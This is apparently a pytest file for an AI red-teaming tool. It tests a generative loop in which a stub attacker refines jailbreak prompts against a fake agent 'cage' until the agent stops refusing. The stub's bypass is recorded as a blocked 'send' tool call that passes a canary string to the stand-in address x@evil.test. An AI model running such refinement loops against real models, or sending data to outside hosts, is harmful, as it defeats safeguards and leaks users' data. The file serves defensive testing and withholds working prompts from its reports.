"""Generative refinement loop — tested with a stub attacker + a graded fake cage."""
from __future__ import annotations

import json

from blastcontain_drill.cage.base import CageObservation, EgressAttempt, ToolCall
from blastcontain_drill.generative import (
    DEFAULT_GOALS,
    StubAttacker,
    goals_for,
    run_generative,
)
from blastcontain_drill.reporter import write_generative_corpus
from blastcontain_drill.scoring import HeuristicContentScorer
from blastcontain_core.models import DrillOutcome

_CANARY = "BCN-CANARY-test"


class FakeCage:
    """Succumbs to exfil only on attempt index >= `succeed_at`; refuses before."""

    name = "fake"

    def __init__(self, succeed_at: int):
        self.succeed_at = succeed_at
        self.calls = 0

    def run_attack(self, attack) -> CageObservation:
        i = self.calls
        self.calls += 1
        obs = CageObservation(canary=_CANARY)
        if i >= self.succeed_at:
            obs.tool_calls = [
                ToolCall(tool="send", arguments={"destination": "x@evil.test", "content": _CANARY},
                         blocked=True, blocked_reason="egress")
            ]
            obs.egress_attempts = [EgressAttempt(host="evil.test", allowed=False, via="send")]
            obs.response_text = "(exfiltrated)"
        else:
            obs.response_text = "I refuse."
        return obs


def _exfil_goal():
    return [g for g in DEFAULT_GOALS if g.id == "g-exfil"]


def test_loop_stops_on_first_bypass():
    cage = FakeCage(succeed_at=2)  # attempts 0,1 HELD; attempt 2 BYPASS
    res = run_generative(_exfil_goal(), cage, [HeuristicContentScorer()], StubAttacker(), max_iters=5)
    r = res[0]
    assert r.success is True
    assert r.iterations == 3              # stopped at the third attempt
    assert r.finding.outcome == DrillOutcome.BYPASS
    assert r.discovered_prompt is not None


def test_loop_refines_with_growing_history():
    class RecordingAttacker(StubAttacker):
        def __init__(self):
            self.history_lens = []

        def craft(self, goal, history):
            self.history_lens.append(len(history))
            return super().craft(goal, history)

    cage = FakeCage(succeed_at=99)        # never succeeds
    attacker = RecordingAttacker()
    res = run_generative(_exfil_goal(), cage, [HeuristicContentScorer()], attacker, max_iters=3)
    assert attacker.history_lens == [0, 1, 2]   # history grows each round
    assert res[0].success is False
    assert res[0].iterations == 3
    assert res[0].discovered_prompt is None


def test_findings_are_generative_and_taxonomy_tagged():
    cage = FakeCage(succeed_at=0)
    res = run_generative(goals_for(), cage, [HeuristicContentScorer()], StubAttacker(), max_iters=2)
    assert len(res) == len(DEFAULT_GOALS)
    for r in res:
        assert r.finding.layer == "generative"
        assert r.finding.technique == "generative"
        assert r.finding.atlas_id


def test_generative_corpus_writes_sensitive_header_and_prompt(tmp_path):
    cage = FakeCage(succeed_at=0)
    res = run_generative(_exfil_goal(), cage, [HeuristicContentScorer()], StubAttacker(), max_iters=1)
    path = tmp_path / "jb.json"
    write_generative_corpus(res, str(path))
    data = json.loads(path.read_text(encoding="utf-8"))
    assert "SENSITIVE" in data["_warning"]
    assert data["results"][0]["success"] is True
    assert data["results"][0]["discovered_prompt"] is not None


def test_full_report_excerpt_does_not_leak_full_prompt():
    # The signed-report finding carries only an excerpt, not the working prompt.
    cage = FakeCage(succeed_at=0)
    res = run_generative(_exfil_goal(), cage, [HeuristicContentScorer()], StubAttacker(), max_iters=1)
    finding = res[0].finding
    assert "withheld from report" in (finding.evidence or "")
